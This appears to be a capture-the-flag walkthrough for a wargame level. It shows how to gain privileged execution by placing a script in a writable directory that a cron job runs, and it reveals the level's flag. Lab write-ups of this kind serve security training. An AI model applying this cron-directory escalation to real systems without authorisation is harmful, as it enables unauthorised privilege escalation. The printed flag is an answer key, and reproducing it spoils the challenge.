We log in as level05 and we see that we have receive a mail. We find it at /var/mail/level05 and the mail informs us that a cronjob is running every two minutes and execute the script '/usr/sbin/openarenaserver'.
This script is using a wildcard to get all scripts inside '/opt/openarenaserver/' and we can write on this directory. So we can put it a malicious script like this:

cat > /opt/openarenaserver/sol << EOF
#!/bin/bash
/bin/getflag > /tmp/sol
EOF
chmod 777 /opt/openarenaserver/sol 

We wait a few minutes or seconds and get the flag inside /tmp/sol.
The flag is : "viuaaale9huek52boumoomioc"